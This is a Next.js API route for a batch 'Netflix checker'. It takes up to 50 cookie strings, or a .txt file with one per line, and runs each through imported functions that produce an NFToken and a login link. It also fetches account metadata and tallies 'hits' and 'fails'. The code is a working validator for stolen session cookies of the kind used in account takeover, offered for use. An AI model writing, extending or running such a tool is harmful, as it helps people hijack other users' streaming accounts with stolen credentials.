import { NextRequest, NextResponse } from "next/server";
import {
  extractCookiesFromText,
  checkCookie,
  getMetadata,
} from "@/lib/netflix-checker";
import type { CheckResult, NFTokenResult, NetflixMetadata } from "@/lib/netflix-checker";

interface BatchResult extends CheckResult {
  index: number;
  rawCookie: string;
}

async function processCookie(
  rawCookie: string,
  index: number
): Promise<BatchResult> {
  const cookieDict = extractCookiesFromText(rawCookie);

  if (!cookieDict || Object.keys(cookieDict).length === 0) {
    return {
      index,
      rawCookie,
      success: false,
      error: "No se pudieron extraer cookies",
    };
  }

  // Step 1: Check NFToken
  const tokenResult: NFTokenResult = await checkCookie(cookieDict);

  if (!tokenResult.success) {
    return {
      index,
      rawCookie,
      success: false,
      error: tokenResult.error || "Error al generar NFToken",
    };
  }

  // Step 2: Get metadata (non-blocking)
  let metadata: NetflixMetadata = {};
  try {
    metadata = await getMetadata(cookieDict);
  } catch {
    // Non-critical failure
  }

  return {
    index,
    rawCookie,
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  };
}

export async function POST(request: NextRequest) {
  try {
    const contentType = request.headers.get("content-type") || "";

    let cookieTexts: string[] = [];

    if (contentType.includes("multipart/form-data")) {
      // Handle file upload
      const formData = await request.formData();
      const file = formData.get("file") as File | null;

      if (!file) {
        // Check if cookies array was sent
        const cookiesRaw = formData.get("cookies");
        if (cookiesRaw) {
          try {
            const parsed = JSON.parse(cookiesRaw as string);
            cookieTexts = Array.isArray(parsed) ? parsed : [cookiesRaw as string];
          } catch {
            cookieTexts = [cookiesRaw as string];
          }
        } else {
          return NextResponse.json(
            { success: false, error: "No se proporcionó archivo ni cookies" },
            { status: 400 }
          );
        }
      } else {
        const buffer = Buffer.from(await file.arrayBuffer());
        const content = buffer.toString("utf-8");

        if (file.name.endsWith(".zip")) {
          // For zip files, we need JSZip server-side
          // Simple approach: treat as text (uncompressed zip won't work this way)
          // In production, you'd use a server-side zip library
          // For now, try to parse as plain text
          return NextResponse.json(
            {
              success: false,
              error: "Archivos ZIP no soportados directamente. Por favor, sube un archivo .txt",
            },
            { status: 400 }
          );
        }

        // Parse txt file - each line is a cookie string
        cookieTexts = content
          .split("\n")
          .map((line) => line.trim())
          .filter((line) => line.length > 0);
      }
    } else {
      // Handle JSON body
      const body = await request.json();
      const { cookies } = body;

      if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
        return NextResponse.json(
          { success: false, error: "Se requiere un array de cookies" },
          { status: 400 }
        );
      }

      cookieTexts = cookies;
    }

    if (cookieTexts.length === 0) {
      return NextResponse.json(
        { success: false, error: "No se encontraron cookies para verificar" },
        { status: 400 }
      );
    }

    // Limit batch size
    if (cookieTexts.length > 50) {
      cookieTexts = cookieTexts.slice(0, 50);
    }

    // Process cookies sequentially (to avoid rate limiting)
    const results: BatchResult[] = [];
    for (let i = 0; i < cookieTexts.length; i++) {
      const result = await processCookie(cookieTexts[i], i);
      results.push(result);
    }

    const hits = results.filter((r) => r.success).length;
    const fails = results.filter((r) => !r.success).length;

    return NextResponse.json({
      results,
      stats: {
        total: results.length,
        hits,
        fails,
      },
    });
  } catch (err: any) {
    console.error("Batch check error:", err);
    return NextResponse.json(
      {
        success: false,
        error: `Error del servidor: ${err.message || "Desconocido"}`,
      },
      { status: 500 }
    );
  }
}
